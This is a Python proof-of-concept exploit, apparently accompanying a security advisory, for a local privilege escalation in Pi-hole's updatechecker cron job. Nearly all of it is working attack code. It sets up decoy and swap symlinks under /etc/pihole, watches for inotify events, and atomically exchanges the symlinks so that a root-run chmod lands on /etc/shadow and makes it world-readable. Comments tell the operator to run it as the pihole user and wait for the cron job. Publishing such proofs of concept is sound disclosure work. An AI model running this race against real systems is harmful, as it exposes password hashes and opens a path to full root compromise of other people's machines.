#!/usr/bin/env python3
#
# LinnemanLabs - updatecheck symlink swap PoC
#
# https://linnemanlabs.com/pi-hole-root-with-extra-steps
# https://github.com/linnemanlabs/advisories/
#
# run as pihole user, leave it running, wait for the next "pihole updatechecker" cron (daily, @reboot)
# this PoC makes /etc/shadow world-readable
#
TARGET = "/etc/shadow"

import os, ctypes, struct, sys, stat
libc = ctypes.CDLL(None)

D = "/etc/pihole"
tdir, tname = os.path.dirname(TARGET), os.path.basename(TARGET).encode()

os.close(os.open(f"{D}/decoy", os.O_CREAT, 0o644))
for name, t in (("versions", f"{D}/decoy"), ("swap", TARGET)):
    try: os.remove(f"{D}/{name}")
    except FileNotFoundError: pass
    os.symlink(t, f"{D}/{name}")
dfd = os.open(D, os.O_RDONLY | os.O_DIRECTORY)
ifd = libc.inotify_init1(0)

# IN_MODIFY: watch for any event on the decoy file
#
# touch fires IN_ATTRIB, truncate fires IN_MODIFY, both fire IN_OPEN
wd_decoy = libc.inotify_add_watch(ifd, f"{D}/decoy".encode(), 0x2)

# IN_ATTRIB in /etc: watch for when the chmod hits /etc/shadow
#
# we cant watch /etc/shadow directly due to permissions so we watch /etc
# potential for conflicts. watching /etc for such small window was 100% hit rate in my tests
wd_tdir  = libc.inotify_add_watch(ifd, tdir.encode(), 0x4)

# atomic symlink exchange (RENAME_EXCHANGE)
#
# fastest operation I found to win the race
exch = lambda: libc.renameat2(dfd, b"versions", dfd, b"swap", 2)
print("[-] staged, waiting for the next updatechecker cron...", flush=True)
armed = False

# wait for events and do the race
while True:
    data = os.read(ifd, 4096)
    off = 0
    while off < len(data):
        wd, mask, cookie, nlen = struct.unpack_from("iIII", data, off); off += 16
        name = data[off:off+nlen].rstrip(b'\0'); off += nlen
        if wd == wd_decoy and not armed:
            # decoy inotify fired, swap symlink
            exch(); armed = True
            print("[+] decoy fired. symlink staged, waiting for chmod..", flush=True)
        elif wd == wd_tdir and armed and name == tname:
            # chmod landed, swap real versions file, prevents junk from being written to target
            os.rename(f"{D}/decoy", f"{D}/versions")
            try: os.remove(f"{D}/swap")
            except FileNotFoundError: pass
            print("[+] /etc inotify fired. symlink (hopefully) landed. swapped versions file. done", flush=True)
            if (stat.S_IMODE(os.stat(TARGET).st_mode) == 0o644):
                print(f"[+] worked. {TARGET} is now chmod 644", flush=True)
            sys.exit(0)
